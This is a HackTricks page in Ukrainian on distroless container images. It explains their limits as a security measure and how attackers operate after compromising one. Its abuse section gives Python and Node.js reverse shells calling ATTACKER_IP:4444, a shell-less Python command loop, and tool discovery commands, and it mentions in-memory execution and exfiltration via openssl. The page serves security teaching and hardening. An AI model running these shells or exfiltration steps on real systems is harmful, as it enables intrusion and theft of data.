# Контейнери Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Образ контейнера **distroless** — це образ, який містить **мінімальні компоненти часу виконання, необхідні для запуску однієї конкретної програми**, при цьому навмисно видаляючи звичні інструменти дистрибуції, такі як package managers, shells та великі набори загальних утиліт userland. На практиці образи distroless часто містять лише бінарник або runtime програми, його спільні бібліотеки, набори сертифікатів і дуже невелику структуру файлової системи.

Суть не в тому, що distroless — це новий примітив ізоляції ядра. Distroless — це стратегія проєктування образів. Вона змінює те, що доступно **всередині** файлової системи контейнера, а не те, як ядро ізолює контейнер. Це важливо, бо distroless підвищує стійкість середовища здебільшого шляхом зменшення того, чим атакувальник може скористатися після отримання виконання коду. Це не замінює namespaces, seccomp, capabilities, AppArmor, SELinux або будь-який інший механізм ізоляції під час виконання.

## Навіщо існують Distroless

Образи distroless переважно використовуються, щоб зменшити:

- розмір образу
- експлуатаційну складність образу
- кількість пакетів і бінарників, які можуть містити вразливості
- кількість post-exploitation інструментів, доступних атакувальнику за замовчуванням

Саме тому образи distroless популярні в production-розгортаннях додатків. Контейнер, який не містить shell, package manager і майже не має загальних інструментів, зазвичай простіше зрозуміти з операційної точки зору і складніше зловживати інтерактивно після компрометації.

Прикладами відомих сімейств образів у стилі distroless є:

- Google's distroless images
- Chainguard hardened/minimal images

## Чого не означає Distroless

Контейнер distroless **не** є:

- автоматично rootless
- автоматично non-privileged
- автоматично read-only
- автоматично захищеним seccomp, AppArmor або SELinux
- автоматично безпечним від container escape

Можна запустити образ distroless з `--privileged`, з спільними просторами імен хоста, з небезпечними bind mount-ами або з примонтованим runtime socket. У такому сценарії образ може бути мінімальним, але контейнер все одно може бути катастрофічно незахищеним. Distroless змінює **userland attack surface**, а не **kernel trust boundary**.

## Типові операційні характеристики

Коли ви компрометували distroless контейнер, перше, що зазвичай помічаєте — звичайні припущення перестають бути вірними. Може не бути `sh`, не бути `bash`, `ls`, `id`, `cat`, а іноді й навіть середовища, що базується на libc, яке поводиться так, як ваше звичне tradecraft очікує. Це впливає і на offense, і на defense, бо відсутність інструментів ускладнює налагодження, incident response і post-exploitation.

Найпоширеніші патерни:

- існує runtime програми, але майже нічого іншого
- shell-based payloads не працюють, бо shell відсутній
- звичайні one-liner-и для переліку інформації не працюють, бо відсутні допоміжні бінарники
- захисти файлової системи, такі як read-only rootfs або `noexec` на примонтованих writable tmpfs місцях, часто теж присутні

Саме поєднання цих факторів зазвичай призводить до того, що говорять про "weaponizing distroless".

## Distroless і Post-Exploitation

Головний офензивний виклик у distroless середовищі не завжди полягає в початковому RCE. Частіше проблема — що відбувається далі. Якщо скомпроментований workload дає виконання коду в мовному runtime, наприклад Python, Node.js, Java або Go, ви можете виконувати довільну логіку, але не через звичайні shell-центричні робочі процеси, які поширені на інших Linux цілях.

Тому post-exploitation часто зміщується в один із трьох напрямків:

1. **Використати наявний language runtime безпосередньо** для переліку середовища, відкриття сокетів, читання файлів або підготовки додаткових payload-ів.
2. **Привнести власні інструменти в пам'ять** якщо файлову систему змонтовано read-only або writable локації змонтовано з `noexec`.
3. **Зловживати наявними бінарниками в образі**, якщо програма або її залежності містять щось несподівано корисне.

## Abuse

### Перевірте наявне середовище виконання

У багатьох distroless контейнерах немає shell, але все ще є runtime програми. Якщо ціль — Python-сервіс, Python там є. Якщо ціль — Node.js, Node там є. Це часто дає достатньо функціональності для переліку файлів, читання змінних оточення, відкриття зворотних шелів і підготовки виконання в пам'яті без виклику `/bin/sh`.

Простий приклад з Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Простий приклад з Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Наслідки:

- відновлення змінних середовища, часто включаючи credentials або service endpoints
- перегляд файлової системи без `/bin/ls`
- виявлення шляхів з правами запису та змонтованих secrets

### Reverse Shell без `/bin/sh`

Якщо образ не містить `sh` або `bash`, класичний shell-based reverse shell може одразу не спрацювати. У такому випадку використайте замість нього встановлене середовище виконання мови.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Якщо `/bin/sh` не існує, замініть останній рядок на пряме виконання команд через Python або на Python REPL loop.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ще раз: якщо `/bin/sh` відсутній, використовуйте безпосередньо Node's filesystem, process і networking APIs замість запуску shell.

### Повний приклад: No-Shell Python Command Loop

Якщо в image є Python, але shell зовсім відсутній, простий інтерактивний цикл часто достатній для збереження повноцінної post-exploitation функціональності:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Це не вимагає бінарного інтерактивного shell. З погляду нападника ефект фактично той самий, що й від базового shell: виконання команд, збір інформації та підготовка подальших payload через існуючий runtime.

### Виконання інструментів у пам'яті

Distroless images часто поєднують з:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Таке поєднання робить класичні робочі процеси "download binary to disk and run it" ненадійними. У таких випадках техніки виконання в пам'яті стають основним вирішенням.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Найбільш релевантними техніками там є:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Існуючі бінарні файли в образі

Деякі distroless images все ще містять операційно необхідні бінарні файли, що стають корисними після компрометації. Часто спостережуваний приклад — `openssl`, оскільки додаткам іноді потрібен він для криптографічних або пов'язаних із TLS задач.

Швидкий шаблон для пошуку:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Якщо `openssl` присутній, його можна використовувати для:

- вихідних TLS-з'єднань
- data exfiltration через дозволений вихідний канал
- staging payload data через закодовані/зашифровані blobs

Точне зловживання залежить від того, що саме встановлено, але загальна ідея така: distroless не означає «відсутність інструментів зовсім»; радше це означає «набагато менше інструментів, ніж у звичайному образі дистрибутива».

## Checks

Мета цих перевірок — визначити, чи образ на практиці дійсно distroless і які runtime або допоміжні binaries все ще доступні для post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Що тут цікаво:

- Якщо відсутній shell, але присутній runtime, такий як Python або Node, то post-exploitation слід переключатися на runtime-driven execution.
- Якщо коренева файлова система доступна лише для читання, а `/dev/shm` записувана, але `noexec`, то memory execution techniques стають значно релевантнішими.
- Якщо присутні helper binaries, такі як `openssl`, `busybox` або `java`, вони можуть надати достатній функціонал для bootstrap подальшого доступу.

## Налаштування runtime за замовчуванням

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Мінімальний userland за задумом | No shell, відсутній package manager, лише залежності додатка/runtime | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Мінімальний userland за задумом | Зменшена поверхня пакетів, часто сфокусовано на одному runtime або сервісі | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Залежить від Pod config | Distroless впливає лише на userland; Pod security posture все ще залежить від Pod spec та runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Залежить від run flags | Мінімальна файловa система, але безпека runtime все ще залежить від flags і конфігурації демона | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Головна думка в тому, що distroless — це **властивість образу**, а не runtime-захист. Його цінність полягає в зменшенні того, що доступне всередині файлової системи після компрометації.

## Суміжні сторінки

Для обхідних шляхів файлової системи та memory-execution, які часто потрібні в distroless-середовищах:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Для зловживань контейнерним runtime, сокетом і маунтами, що й досі застосовні до distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
